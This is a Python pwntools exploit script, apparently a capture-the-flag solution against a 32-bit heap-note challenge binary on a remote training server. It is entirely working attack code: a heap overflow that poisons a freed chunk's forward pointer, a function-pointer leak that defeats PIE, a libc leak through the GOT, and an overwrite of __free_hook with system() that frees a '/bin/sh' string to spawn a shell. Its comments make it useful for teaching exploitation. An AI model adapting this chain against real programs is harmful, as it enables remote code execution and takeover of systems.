from pwn import *

PROG_NAME = "./notezpz"
REMOTE_IP = "plsdonthaq.me"
REMOTE_PORT = 7003
REMOTE_LIBC = "./libc6_2.27-3ubuntu1_i386.so"
LOCAL_LIBC = "/lib/i386-linux-gnu/libc.so.6"

if args.REMOTE:
    p = remote(REMOTE_IP, REMOTE_PORT)
    elf = ELF(PROG_NAME)
    libc = ELF(REMOTE_LIBC)
else:
    p = process(PROG_NAME)
    elf = p.elf
    libc = ELF(LOCAL_LIBC)

def create(num):
	p.recvuntil("refresh): ")
	p.sendline("C")

def free(num):
	p.recvuntil("refresh): ")
	p.sendline("D")
	p.sendline(str(num))

def set(num, data):
	p.recvuntil("refresh): ")
	p.sendline("S")
	p.sendline(str(num))
	p.sendline(data)
	print(num, data)

def ask(num):
	p.recvuntil("refresh): ")
	p.sendline("A")
	p.sendline(str(num))
	p.recvuntil("I have the answer perhaps: '")
	data = p.recvuntil("'", drop=True).rstrip()
	return data[:-1] if data[-1]=="'" else data

# same as the gen_addr_payload from ezpz1 solution
# but this time the first chunk of a question has a function
# pointer so we need to write that in, to allow for reading data
def gen_addr_payload(fn_ptr_addr, arbitrary_addr):
	overflow = b'A'*0x1c
	overflow += p32(0x21)
	overflow += p32(fn_ptr_addr)
	overflow += b'A'*0x14
	overflow += p32(arbitrary_addr)
	overflow += p32(0x21)
	return overflow

'''
full protections
function pointer is back
heap overflow is still there
'''

create(0)
create(1)
create(2)
create(3)
free(1)
free(2)
create(4) # same addr as q2

# this leaves the fwd pointer of q2 but resets the function pointer to print_question
# note that this fwd pointer should point to the first chunk of q1
heap_chunk_1_of_1 = u32(ask(4)[:4])
free(4)

# now that q4 (well q2) is free, we want to overwrite its fwd pointer to the first chunk of any question,
# so we can read the print_question function address
# q3 is untarnished so far, so that will have the function pointer
heap_chunk_1_of_3 = heap_chunk_1_of_1 + (0x20*2*2) # each question has 2 0x20 chunks
overflow = b'A'*0x1c # fill q1's 2nd chunk
overflow += p32(0x21) # preserve q2's 1st chunk metadata
overflow += p32(heap_chunk_1_of_3) # overwrite q2's fwd pointer in chunk 1
set(1, overflow)

# since we overwrote the fwd pointer of q2's first chunk to point to q3's first chunk
# the first newly allocated chunk for q5 will be q2's first chunk
# but the 2nd newly allocated chunk for q5 will be q3's first chunk (which has the function pointer)
create(5) # same addr as q2 and q4

# leak the print_question function address and overcome PIE
print_question_addr = u32(ask(5)[:4])
binary_base = print_question_addr - elf.symbols['print_question']
elf.address = binary_base

# leak a libc address by reading from the GOT's fgets entry
set(1, gen_addr_payload(print_question_addr, elf.got['fgets']))
fgets_addr = u32(ask(5)[:4])
libc_base = fgets_addr - libc.symbols['fgets']
libc.address = libc_base

# since there's full RELRO we can't write to the GOT
# so instead we overwrite the __free_hook (used by free()) with system()
set(1, gen_addr_payload(print_question_addr, libc.symbols['__free_hook']))
set(5, p32(libc.symbols['system'])) # remember q2 and q5 point to same memory

# q0 is untarnished, so we can set it's string to /bin/sh
set(0, "/bin/sh\x00")

# since the string (2nd chunk) of a question is freed before the first chunk
# free will be called with the address of our /bin/sh string first
# since __free_hook was overwritten this has the effect of system("/bin/sh")
free(0)

p.interactive()

